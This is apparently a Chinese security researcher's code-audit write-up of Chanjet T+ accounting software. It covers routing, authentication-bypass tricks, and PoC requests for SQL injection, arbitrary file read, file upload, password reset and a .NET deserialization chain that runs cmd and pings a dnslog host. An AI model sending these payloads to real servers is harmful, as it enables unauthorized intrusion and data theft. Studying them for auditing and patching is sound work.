## 畅捷通目录结构

只要本地有数据库，打开畅捷通T+云主机版17.0，双击setup.exe，可以一键安装。

默认安装地址为`C:\Program Files (x86)\Chanjet\TPlusPro\`。目录结构如下

```
TPlusPro
	|- Appserver
	|- Browser
	|- DBServer
	|- Fubao
	|- VPN
	|- WebServer
	|- WebSite
	|- instPatch.log
	|- PatchBuildInfo.xml
	|- ProductBudilInfo.xml
	|- UnInstall.exe
```

源码位于`WebSite`文件夹。畅捷通的`WebSite`中的aspx打开后会发现都只有一句话`这是预编译工具生成的标记文件，不应删除!`。也就是源代码都是经过预编译处理的。这种预编译的系统需要注意一个问题。所有的ASPX文件会和源码一起编译成`.dll`文件。所以畅捷通测试时，文件上传漏洞是无法使用ASPX木马的，可以上传ASP代码。或者用`aspnet_compiler.exe`编译ASPX木马，然后把生成的`.dll`和`.compiled`两个文件上传到畅捷通的bin目录下。



<img src="/images/image-20230829101922114.png" alt="image-20230829101922114" style="zoom: 67%;" />

打开`Web.config`，部分内容如下

```xml
<?xml version="1.0"?>
<configuration> <!--Web.config的根元素-->
  <appSettings file="AccountOptionValidators.config"> <!--用于定义程序的自定义配置项-->
    <add key="BaseFilePath" value="E:\tong11_vss_workingFolder\YYJC_Tong\Comp_Tong11.0\src\T2007\" />
    <add key="ReportViewerMessages" value="Ufida.T.EAP.Report.Control.ReportViewerMessagesZhcn,Ufida.T.EAP.Report.Control" />
    <add key="TongReportViewPageSize" value="200" />
    ...
  </appSettings>
  <connectionStrings /> <!--用于定义程序的数据库连接字符串-->
  <system.web> <!--用于定义程序的相关配置，如Session、Authentication、compilation-->
    <httpRuntime maxRequestLength="2097151" executionTimeout="36000" requestValidationMode="2.0" maxQueryStringLength="10240" requestLengthDiskThreshold="8192" />
    <healthMonitoring>
      <rules>
        <add name="Application Lifetime Events Default" eventName="Application Lifetime Events" provider="EventLogProvider" profile="Default" minInstances="1" maxLimit="Infinite" minInterval="00:01:00" custom="" />
      </rules>
    </healthMonitoring>
    <httpHandlers>
      <add verb="POST,GET" path="ajaxpro/*.ashx" type="AjaxPro.AjaxHandlerFactory,AjaxPro.2" />
      <add path="Reserved.ReportViewerWebControl.axd" verb="*" type="Microsoft.Reporting.WebForms.HttpHandler, Microsoft.ReportViewer.WebForms, Version=8.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" validate="false" />
      <add verb="*" path="App_Themes/*/*.ashx,UserFiles/*.ashx,UserFiles/*/*/*.ashx,lib/*/*.ashx,css/*/*.ashx,js/*/*.ashx,css/*.ashx,js/*.ashx" type="Ufida.T.BAP.Web.Base.ScriptFileHandler,Ufida.T.BAP.Web" />
      <add verb="*" path="img/*.ashx" type="Ufida.T.BAP.Web.Base.ImgFileHandler,Ufida.T.BAP.Web" />
      <add path="ChartImg.axd" verb="GET,HEAD,POST" type="System.Web.UI.DataVisualization.Charting.ChartHttpHandler, System.Web.DataVisualization, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" validate="false" />
      <add verb="*" path="api/rest" type="Ufida.T.EAP.Rest.RestHandlerFactory,Ufida.T.EAP.Rest" />
      <add verb="*" path="api/v1/*,api/v1/*/*,api/v1/*/*/*,api/v1/*/*/*/*,api/v1/*/*/*/*/*" type="Ufida.T.EAP.Rest.RestHandlerFactory,Ufida.T.EAP.Rest" />
      <add verb="*" path="api/v2/*,api/v2/*/*,api/v2/*/*/*,api/v2/*/*/*/*,api/v2/*/*/*/*/*" type="Ufida.T.EAP.Rest.RestHandlerFactory,Ufida.T.EAP.Rest" />
    </httpHandlers>
    <webServices>
      <protocols>
        <add name="HttpPost"/>
      </protocols>
    </webServices>
    <authentication mode="None" />
    <identity impersonate="false" userName="" password="" />
    <sessionState mode="Custom" customProvider="LocalSessionProvider" timeout="480">
      <providers>
        <add name="MySessionProvider" type="Ufida.T.EAP.RedisSessionProviders.NonLockingRedisSessionStateStoreProvider,Ufida.T.EAP.RedisSessionProviders" ssl="false" />
        <add name="LocalSessionProvider" type="Ufida.T.Tool.SessionProvider.ChanJetSessionStateProvider, Ufida.T.Tool.SessionProvider" />
      </providers>
    </sessionState>
    <!--报表增加内容-->
    <globalization culture="zh-CN" uiCulture="zh-CHS" />
    <customErrors mode="Off" />
  </system.web>
  <system.webServer> <!--用于定义应用程序的IIS相关配置，如Handlers、Modules、Security等-->
    <validation validateIntegratedModeConfiguration="false" />
    <handlers>
	  <remove name="WebDAV" />
      <add name="ChartImageHandler" preCondition="integratedMode" verb="GET,HEAD,POST" path="ChartImg.axd" type="System.Web.UI.DataVisualization.Charting.ChartHttpHandler, System.Web.DataVisualization, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" />
      <add name="AjaxProHandle" preCondition="integratedMode" verb="POST,GET" path="ajaxpro/*.ashx" type="AjaxPro.AjaxHandlerFactory,AjaxPro.2" />
      <add name="ScriptFileHandler1" preCondition="integratedMode" verb="*" path="js/*.ashx" type="Ufida.T.BAP.Web.Base.ScriptFileHandler,Ufida.T.BAP.Web" />
      <add name="CssScriptFileHandler1" preCondition="integratedMode" verb="*" path="css/*.ashx" type="Ufida.T.BAP.Web.Base.ScriptFileHandler,Ufida.T.BAP.Web" />
      <add name="CssScriptFileHandler2" preCondition="integratedMode" verb="*" path="css/*/*.ashx" type="Ufida.T.BAP.Web.Base.ScriptFileHandler,Ufida.T.BAP.Web" />
      <add name="JsScriptFileHandler1" preCondition="integratedMode" verb="*" path="js/*/*.ashx" type="Ufida.T.BAP.Web.Base.ScriptFileHandler,Ufida.T.BAP.Web" />
      <add name="UserFileScriptFileHandler1" preCondition="integratedMode" verb="*" path="UserFiles/*.ashx" type="Ufida.T.BAP.Web.Base.ScriptFileHandler,Ufida.T.BAP.Web" />
      <add name="App_ThemesScriptFileHandler" preCondition="integratedMode" verb="*" path="App_Themes/*/*.ashx" type="Ufida.T.BAP.Web.Base.ScriptFileHandler,Ufida.T.BAP.Web" />
      <add name="LibScriptFileHandler" preCondition="integratedMode" verb="*" path="lib/*/*.ashx" type="Ufida.T.BAP.Web.Base.ScriptFileHandler,Ufida.T.BAP.Web" />
      <add name="ImgFileHandler" preCondition="integratedMode" verb="*" path="img/*.ashx" type="Ufida.T.BAP.Web.Base.ImgFileHandler,Ufida.T.BAP.Web" />
      <add name="RestHandlerFactory" preCondition="integratedMode" verb="*" path="api/rest" type="Ufida.T.EAP.Rest.RestHandlerFactory,Ufida.T.EAP.Rest" />
      <add name="RestHandlerFactory1" preCondition="integratedMode" verb="*" path="api/v1/*" type="Ufida.T.EAP.Rest.RestHandlerFactory,Ufida.T.EAP.Rest" />
      <add name="RestHandlerFactory2" preCondition="integratedMode" verb="*" path="api/v1/*/*" type="Ufida.T.EAP.Rest.RestHandlerFactory,Ufida.T.EAP.Rest" />
      <add name="RestHandlerFactory3" preCondition="integratedMode" verb="*" path="api/v1/*/*/*" type="Ufida.T.EAP.Rest.RestHandlerFactory,Ufida.T.EAP.Rest" />
      <add name="RestHandlerFactory4" preCondition="integratedMode" verb="*" path="api/v1/*/*/*/*" type="Ufida.T.EAP.Rest.RestHandlerFactory,Ufida.T.EAP.Rest" />
      <add name="RestHandlerFactory5" preCondition="integratedMode" verb="*" path="api/v1/*/*/*/*/*" type="Ufida.T.EAP.Rest.RestHandlerFactory,Ufida.T.EAP.Rest" />
      <add name="RestHandlerFactory6" preCondition="integratedMode" verb="*" path="api/v2/*" type="Ufida.T.EAP.Rest.RestHandlerFactory,Ufida.T.EAP.Rest" />
      <add name="RestHandlerFactory7" preCondition="integratedMode" verb="*" path="api/v2/*/*" type="Ufida.T.EAP.Rest.RestHandlerFactory,Ufida.T.EAP.Rest" />
      <add name="RestHandlerFactory8" preCondition="integratedMode" verb="*" path="api/v2/*/*/*" type="Ufida.T.EAP.Rest.RestHandlerFactory,Ufida.T.EAP.Rest" />
      <add name="RestHandlerFactory9" preCondition="integratedMode" verb="*" path="api/v2/*/*/*/*" type="Ufida.T.EAP.Rest.RestHandlerFactory,Ufida.T.EAP.Rest" />
      <add name="RestHandlerFactory10" preCondition="integratedMode" verb="*" path="api/v2/*/*/*/*/*" type="Ufida.T.EAP.Rest.RestHandlerFactory,Ufida.T.EAP.Rest" />
    </handlers>
    <modules runAllManagedModulesForAllRequests="true" runManagedModulesForWebDavRequests="true">
		<remove name="WebDAVModule" />
      <remove name="EapClientTip" />
      <add name="EapClientTip" type="EapTipHandler" />
    </modules>
    <security>
      <requestFiltering allowDoubleEscaping="true">
        <requestLimits maxAllowedContentLength="3221225470" maxQueryString ="10240"/>
      </requestFiltering>
    </security>
  </system.webServer>
</configuration>
```

## 路由

路由包含两种，（1）aspx文件（主要找aspx的编译文件对应的dll的`Page_Load()`方法） （2）找dll文件中的某个类的`[AjaxMethod]`标签下的方法（因为用到了AjaxPro）

**（1）aspx路由审计**

WebSite文件夹中可以看到每个文件夹内都是`.aspx`文件。由于畅捷通采用的是预编译的方式，一般会在`bin`文件夹下存放编译后的`dll`和`.compiled`文件。通过相对路径访问`.aspx`。例如访问`/SM/SetupAccount/Upload.aspx`

需要在预编译的目录下`/Chanjet/TPlusPro/WebSite/bin`，在其中找到此文对应的compiled文件`upload.aspx.xxx.compiled`。内容如下。系统中存在多个`upload.aspx`。所以需要打开`.compiled`文件查看其中`filedep`，即依赖文件的值。或者根据原aspx的hash值来计算。

```xml
<?xml version="1.0" encoding="utf-8"?>
<preserve resultType="3" virtualPath="/WebSite/SM/SetupAccount/Upload.aspx" hash="16f32931f" filehash="8aff27fcb5b4a92d" flags="110000" assembly="App_Web_upload.aspx.9475d17f" type="ASP.sm_setupaccount_upload_aspx">
    <filedeps>
        <filedep name="/WebSite/SM/SetupAccount/Upload.aspx" />
        <filedep name="/WebSite/SM/SetupAccount/Upload.aspx.cs" />
    </filedeps>
</preserve>
```

根据文件中的`assembly="App_Web_upload.aspx.9475d17f"`找到对应的编译之后的dll文件。然后找到dll文件中的`Page_Load()`方法。

**（2）AjaxPro方法审计**

AjaxPro一般要在页面的`Page_Load()`中注册事件。然后在页面的方法上标记`[AjaxPro.AjaxMethod]`

```C#
  protected void Page_Load(object sender, EventArgs e)
  {
    try
    {
      Utility.RegisterTypeForAjax(typeof (SM_RunManage_DomainManager));
    }
    catch (Exception ex)
    {
      ExceptionHandlerFactory.GetExceptionHandler(ex).Handle((object) this.Page);
    }
  }
```

访问路由一般为`/tplus/ajaxpro/`+` Controller对应的命名空间`+`,`+`命名空间的包名.ashx`+`?`+`方法名`

**示例1**

路由：`/tplus/ajaxpro/Ufida.T.SM.UIP.ScheduleManage.ScheduleManageController,Ufida.T.SM.UIP.ashx?method=GetScheduleLogList`

```
namespace Ufida.T.SM.UIP.ScheduleManage
{
  [AjaxNamespace("ScheduleManageController")]
  public class ScheduleManageController{ 
    [AjaxMethod]  
    public string GetScheduleLogList(string scheduleName)
```

**示例2**

路由`POST /tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex`

```
namespace Ufida.T.SM.UIP
{
  [ClientObject("Ufida.T.SM.Client.MultiCompany")]
  public class MultiCompanyController : ReadonlyListController<IEntityService<DTO>, DTO>
  {
```



## Global.asax

Global.asax包含应用程序级别的事件处理程序和全局设置。（1）应用程序级别的事件处理，如Application_Start、Session_Start等。在应用程序启动和关闭时执行一些特定的操作。（2）全局设置，定义一些全局设置，应用程序的默认语言、错误页面、缓存策略等。（3）自定义路由。

其中`Application_PrequestHandlerExecute()`将请求发送给处理对象（页面或者WebService）

```c#
protected void Application_PreRequestHandlerExecute(object sender, EventArgs e)
{
    string a = ConfigurationManager.AppSettings["enhanceprotection"]; // 从应用程序配置文件App.Config或者Web.Config中获取名为enhanceprotection键的值 - 1
    string a2 = ConfigurationManager.AppSettings["enhanceprotection2"]; // 0
    HttpApplication httpApplication = (HttpApplication)sender; // HttpApplication表示应用程序的对象，可以获取应用程序级别的变量和方法
    HttpContext context = httpApplication.Context; // 存有请求url、请求参数、请求头等信息
    string text = string.Empty;
    try
    {
        if (context.Request != null)
        {
            string filePath = context.Request.FilePath; // 获取请求对应的文件路径
            bool flag = context.Request.QueryString["preload"] == "1"; // http请求中查询字符串是否包含preload参数，且值为1
            text = HttpContext.Current.Request.Url.ToString(); // 获取请求的url
            if (flag) { return; }
            if (RequestChecker.IsBaseRquest(text)) { return; } // 白名单检查
            if (!string.IsNullOrEmpty(filePath))
            {
                string[] array = filePath.Split(new char[]{ '/' }); // 如果路由为/a/b/c,那么会返回一个字符数组["a","b","c"]
                int num = array.Length - 1;
                string text2 = array[num].ToLower();
                if (RequestChecker.IsSpecialRequest(text2)){ return; } // 定义了诸多SpecialRequest，如login.aspx、changepassword.aspx等
                if (text2 == "admin.aspx" && context.Request["from"] == "install") { return; }
            }
            if (filePath.ToLower().EndsWith("tplusapi/monitor/")) { return; }
            string[] array2 = filePath.Split(new char[] { '.' }); // 用.分割文件路径。以/tplus/ajaxpro/Ufida.T.DI.UIP.StockSalesReportVoucheController,Ufida.T.DI.UIP.ashx分割的结果为
            ["/tplus/ajaxpro/Ufida","T","DI","UIP","StockSalesReportVoucheController,Ufida","T","DI","ashx"]
            int num2 = array2.Length - 1;
            if (array2[num2].ToString().ToLower() != "aspx" && !this.IsNeedCheckUserOnline() && context.Request != null)
            {
                string value = context.Request.Headers["x-ajaxpro-method"];
                if (string.IsNullOrEmpty(value)) { return; }
                if (ServerConstants.serverActor == ServerConstants.ServerActor.Report)
                {
                    Ufida.T.EAP.Aop.Imp.User.GetUserWithoutLocal();
                }
            }
        ...
    }
```

路由后续是要经过登陆校验的，想要绕过登陆认证就需要满足执行return的条件。找到上述方法中包含return的条件。

```
(1) preload=1
bool flag = context.Request.QueryString["preload"] == "1";
if (flag) { return; }
(2) if (RequestChecker.IsBaseRquest(text)) { return; } 
(3) if (RequestChecker.IsSpecialRequest(text2)){ return; }
(4) if (text2 == "admin.aspx" && context.Request["from"] == "install") { return; }
(5) if (filePath.ToLower().EndsWith("tplusapi/monitor/")) { return; }
```

第一种情况，`preload==1`的话会return，跳出权限验证。这也是很多畅捷通漏洞攻击常用的。第二种情况是符合白名单检查。`RequestChecker.IsBaseRquest(text)`判断`url`是否包含某些字段。IndexOf函数只要找到了字段就满足`>=0`的条件

```java
    public static bool IsBaseRquest(string url)
    {
      string lower = url.ToLower();
      return lower.IndexOf("login") >= 0 || lower.IndexOf("token") >= 0 || lower.IndexOf(".js") >= 0 || lower.IndexOf(".css") >= 0 || lower.IndexOf(".jpg") >= 0 || lower.IndexOf(".png") >= 0 || lower.IndexOf(".bmp") >= 0 || lower.IndexOf(".svg") >= 0 || lower.IndexOf(".gif") >= 0 || lower.IndexOf(".png") >= 0 || lower.IndexOf("download") >= 0 || lower.IndexOf(".rar") >= 0 || lower.IndexOf(".htm") >= 0 || lower.IndexOf(".ico") >= 0 || lower.IndexOf(".xml") >= 0 || lower.IndexOf(".zip") >= 0 || lower.IndexOf("/rest") >= 0 || lower.IndexOf("/v1") >= 0 || lower.IndexOf("/v2") >= 0 || lower.IndexOf(".eof") >= 0 || lower.IndexOf(".ttf") >= 0 || lower.IndexOf(".woff") >= 0 || lower.IndexOf(".json") >= 0 || lower.IndexOf("getjumpurl") >= 0 || lower.IndexOf("getactivateurl") >= 0 || lower.IndexOf("ip.html") >= 0 || lower.IndexOf("syncache.aspx") >= 0 || lower.IndexOf("prototype.ashx") >= 0 || lower.IndexOf("converter.ashx") >= 0 || lower.IndexOf("getimg.ashx") >= 0 || lower.IndexOf("unregisterpage") >= 0 || lower.IndexOf("method=getversionnum") >= 0 || lower.IndexOf("createaccountcontroller") >= 0 || lower.IndexOf("commonpage_setupaccount_dialog") >= 0 || lower.IndexOf("ufida.t.sm.uip.setupaccount.createmanagercontroller,ufida.t.sm.uip.ashx?method=logout") >= 0 || lower.IndexOf("sm/messagecenter/handler.aspx") >= 0;
    }
```

假如路由`/tplus/SM/SetupAccount/Upload.aspx`需要访问权限，那么想要绕过访问权限需要在路由中加入`login`等关键字。常见绕过方式包括如下两种。第一种常见于tomcat+spring的环境，用`getRequestURI()`来处理请求。第二种则适合此种场景，只要url中包括关键字段即可，也不影响实际路由解析

````
/tplus/1.js/../SM/SetupAccount/Upload.aspx
/tplus/SM/SetupAccount/Upload.aspx?login=1
````


## 历史漏洞

| 漏洞名称                                          | 访问路由                                                     |
| ------------------------------------------------- | ------------------------------------------------------------ |
| GetScheduleLogList SQL注入漏洞                    | `/tplus/ajaxpro/Ufida.T.SM.UIP.ScheduleManage.ScheduleManageController,Ufida.T.SM.UIP.ashx?method=GetScheduleLogList` |
| DownloadProxy.aspx 任意文件读取漏洞               | `/tplus/SM/DTS/DownloadProxy.aspx?Path=../../Web.Config`     |
| testuploadspeed.aspx  文件上传漏洞                | `/tplus/sm/upload/testuploadspeed.aspx`                      |
| recoverpassword.aspx密码重置漏洞                  | `/tplus/ajaxpro/RecoverPassword,App_Web_recoverpassword.aspx.cdcab7d2.ashx?method=SetNewPwd` |
| Upload.aspx 任意文件上传漏洞                      | `/tplus/SM/SetupAccount/Upload.aspx?preload=1`               |
| GetStoreWarehouseByStore 反序列化漏洞             | `/tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore` |
| Ufida.T.SM.UIP.MultiCompanyController SQL注入漏洞 | `/tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex` |



### GetScheduleLogList SQL注入漏洞

漏洞点位于`ScheduleManageController.cs`

```C#
namespace Ufida.T.SM.UIP.ScheduleManage
{
  [AjaxNamespace("ScheduleManageController")]
  public class ScheduleManageController{ 
    [AjaxMethod]  
    public string GetScheduleLogList(string scheduleName)
      {
        string empty = string.Empty;
        DataTable scheduleLog=this.sm.GetScheduleLog(scheduleName);
        return this.ConvertToJsonStr(scheduleLog);
      }
  }
}
```

跟进`ScheduleManage#GetScheduleLog()`

```C#
    public DataTable GetScheduleLog(string serviceName)
    {
      string text = "select *, case IsRunSuccess when 1 then '成功' else '失败' end as IsRunSuccessView from Eap_ScheduleLog";
      if(!string.IsNullOrEmpty(serviceName)){
        text+="where serviceName='{0}'";
        text+="order by id desc";
        text=string.Format(text,serviceName);
      }
      return this.Query(text);
    }
```

如果`scheduleName`参数可控即可造成sql注入。发送POST包`{"scheduleName":"xxx"}`。该漏洞已被修复，首先会对参数进行过滤。另外在GetScheduleLog实现时用了参数化查询。

```C#
    public string GetScheduleLogList(string scheduleName)
    {
      if (!string.IsNullOrEmpty(scheduleName))
        FilterInfo.FilterParameter(scheduleName); // exec、 delete、update、select、master、truncate、declare、create、xp_、current_user 都被过滤
      string empty = string.Empty;
      return this.ConvertToJsonStr(this.sm.GetScheduleLog(scheduleName));
    }
```



### Downloadproxy.aspx 任意文件下载

POC

```
/tplus/SM/DTS/DownloadProxy.aspx?Path=../../Web.Config
```

对应的代码如下

```C#
  protected void Page_Load(object sender, EventArgs e)
  {
  	string text=base.Server.UrlDecode(base.Request.QueryString["Path"]); // 获取Path参数值
  	string text2=text.SubString(text.LastIndexOf("\\")+1); 如果没有找到\就是-1，substring(0)则是原样输出字符串
  	if(text2.LastIndexOf("_")>0){ text2=text.Substring(text.LastIndexOf("_")+1) }
  	base.Response.Buffer=true;
  	base.Response.ContentType="application/octet-stream";
  	base.Response.AddHeader("Content-Disposition","attachment:filename="+base.Server.UrlPathEncode(text2));
  	base.Response.WriteFile(text,true);
  	File.Delete(text);
  	base.Response.End();
 }
```

### testuploadspeed.aspx 任意文件上传漏洞

漏洞位于`sm/upload/testuploadspeed.aspx`

```C#
  protected void Page_Load(object sender, EventArgs e)
  {
    HttpFileCollection files=HttpContext.Current.Request.Files;
    if(files.Count > 0){
      	try{
          for(int i=0;i<files.Count;i++){
            HttpPostedFile httpPostedFile=base.Request.Files[i];
            string text=base.Request.MapPath("~")+"\\Templates\\"+httpPostedFile.FileName.Substring(httpPostedFile.FileName.LastIndexOf("\\")+1);
            httpPostedFile.SaveAs(text);
            File.Delete(text);
            base.Response.Write("Success\r\n");
          }
          base.Response.End();
        }
    }
```

多线程向`http://ip/tplus/sm/upload/testuploadspeed.aspx`上传文件，赶在文件删除前保存下来。

### recoverpassword.aspx 密码重置漏洞

```C#
  [AjaxMethod]
  public bool SetNewPwd(string userVerCode, string pwdNew)
  {
    try
    {
      pwdNew = this.LoginService.EncodeMD5(pwdNew);
      pwdNew = this.LoginService.EncodeBase64(pwdNew);
      return this.accountService.RecoverSystemPassword(pwdNew);
    }
    
  public bool RecoverSystemPassword(string newpw)
  {
      DBSession dbsession=DBSessionFactory.getDBSession("UFTSystem");
    	sting sql="UPDATE EAP_ConfigPath SET AdminPassword='" + newpw + "' WHERE idTenant IS NULL AND User_Name=''";
      int num=dbsession.executeNonQuery(sql);
    	this.ReSetConfigPathCache();
      return num > 0;
  }
```

然后在浏览器中访问recoverpassword.aspx页面，找到Js中找到SetNewPwd的位置

```js
_RecoverPassword_class=function(){};
Object.extend(_RecoverPassword_class.prototype, Object.extend(new AjaxPro.AjaxClass(),{
	GetEmail: function(){
		return this.invoke("GetEmail",{}, this.GetEmail.getArguments().slice(0));
	},
	SendVerCode: function(){
		return this.invoke("SendVerCode",{}, this.SendVerCode.getArguments().slice(0));
	},
	ChkVerCode: functioin(userVerCode){
		return this.invoke("ChkVerCode",{"userVerCode":userVerCode},this.ChkVerCode.getArguments().slice(1));
	},
	SetNewPwd: function(pwdNew){
		return this.invoke("SetNewPwd",{"pwdNew":pwdNew},this.SetNewPwd.getArguments().slice(1));
	},
	url:'/tplus/ajaxpro/RecoverPassword,App_Web_recoverpassword.aspx.cdcab7d2.ashx'
}));
_RecoverPassword=new _RecoverPassword_class();
```

也就是想要访问该方法对应的路由为`/tplus/ajaxpro/RecoverPassword,App_Web_recoverpassword.aspx.cdcab7d2.ashx?method=SetNewPwd`

### Upload.aspx 任意文件上传漏洞 （CNVD-2022-60632）

漏洞位于`/SM/SetupAccount/Upload.aspx`，打开文件会显示“这是预编译工具生成的标记文件，不应删除”。找到预编译文件对应的compiled文件`download.aspx.xxx.compiled`。根据文件中的`assembly="App_Web_upload.aspx.9475d17f"`找到对应的编译之后的dll文件。

```
<?xml version="1.0" encoding="utf-8"?>
<preserve resultType="3" virtualPath="/WebSite/SM/SetupAccount/Upload.aspx" hash="16f32931f" filehash="8aff27fcb5b4a92d" flags="110000" assembly="App_Web_upload.aspx.9475d17f" type="ASP.sm_setupaccount_upload_aspx">
    <filedeps>
        <filedep name="/WebSite/SM/SetupAccount/Upload.aspx" />
        <filedep name="/WebSite/SM/SetupAccount/Upload.aspx.cs" />
    </filedeps>
</preserve>
```

请求包如下

```
POST /tplus/SM/SetupAccount/Upload.aspx?preload=1 HTTP/1.1
Host: ip:port
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywwk2ReqGTj7lNYlt
Content-Length: 184

------WebKitFormBoundarywwk2ReqGTj7lNYlt
Content-Disposition: form-data; name="File1";filename="test.aspx"
Content-Type: image/jpeg

1
------WebKitFormBoundarywwk2ReqGTj7lNYlt--
```

响应200，并且可以在`/Chanjet/TPlusPro/WebSite/SM/SetupAccount/images`中看到相应的aspx文件。可以在filename中用`../`跨目录。

在Rider中打开该dll的`<Root Namespace>`，找到`Page_Load()`方法下的内容，

```C#
protected void Page_Load(object sender, EventArgs e)
  {
    this.ReadResources();
    if (this.Request.Files.Count != 1)
      return;
    string str1 = "images/index.gif";
    object obj = this.ViewState["fileName"];
    if (obj != null)
      str1 = obj.ToString();
    if (this.File1.PostedFile.ContentLength > 204800)
      this.Response.Write("<script language='javascript'>alert('" + this.PhotoTooLarge + "'); parent.document.getElementById('myimg').src='" + str1 + "';</script>");
    else if (this.File1.PostedFile.ContentType != "image/jpeg" && this.File1.PostedFile.ContentType != "image/bmp" && this.File1.PostedFile.ContentType != "image/gif" && this.File1.PostedFile.ContentType != "image/pjpeg")
    {
      this.Response.Write("<script language='javascript'>alert('" + this.PhotoTypeError + "'); parent.document.getElementById('myimg').src='" + str1 + "';</script>");
    }
    else
    {
      string fileName = this.File1.PostedFile.FileName;
      string str2 = fileName.Substring(fileName.LastIndexOf('\\') + 1);
      this.File1.PostedFile.SaveAs(this.Server.MapPath(".") + "\\images\\" + str2);
      string str3 = this.Server.MapPath(".") + "\\images\\" + str2;
      this.ViewState["fileName"] = (object) ("images/" + str2);
      TPContext.Current.Session["ImageName"] = (object) str3;
    }
```

上传的文件不大于2M，然后判断Content-Type 是`image/jpeg、image/bmp、image/gif、image/pjpeg`其中一个类型。就会将文件写入到images目录中。文件名直接用的上传文件的filename参数值，没有进行过滤等操作。



### GetStoreWarehouseByStore 反序列化漏洞

网传流量如下。问题的原因是因为使用了AjaxPro2

```
POST /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore HTTP/1.1
Host: your-ip
X-Ajaxpro-Method: GetStoreWarehouseByStore
 
{
  "storeID":{}
}
```

全局搜索`GetStoreWarehouseByStore`，定位到`/_PriorityLevel.cs`。

```
    public WarehouseDTO GetStoreWarehouseByStore(object storeID)
    {
      IRRAService service = ServiceFactory.getService() as IRRAService;
      WarehouseDTO warehouseByStore = (WarehouseDTO) null;
      if (service != null)
        warehouseByStore = service.GetStoreWarehouseByStore(Convert.ToString(storeID));
      return warehouseByStore;
    }
```

传入.net反序列化链条

```
{"storeID":{   
	"__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
	"MethodName":"Start","ObjectInstance":{
		"__type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
		"StartInfo": {
			"__type":"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
			"FileName":"cmd",
			"Arguments":"/c ping test.5f2d7i.dnslog.cn"
			}}}
}
```

AjaxPro要求参数类型为`(object xx)`，用的链条生成方式

```
ysoserial.exe -g ObjectDataProvider -f JavaScriptSerializer -c "calc" -raw
```



### MultiCompanyController SQL注入漏洞

```
POST /tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex HTTP/1.1
Host: your-ip
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
 
{"accNum": "3' AND 5227 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(112)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (5227=5227) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(107)+CHAR(120)+CHAR(113)))-- NCab", "functionTag": "SYS0104", "url": ""}
```

核心代码

```
if (functionTag == "SYS0104")
    service.CheckUserFunction(accNum);
    service.RegisterFunction(url, accNum, functionTag);

DataRow[] dataRows = UseFunctionLogCacheManager.GetDataRows("userid <> '" + userid + "' and Acaa_Num = '" + accountNum + "' and  Version = '" + version.ToString() + "'", "begintime");
```


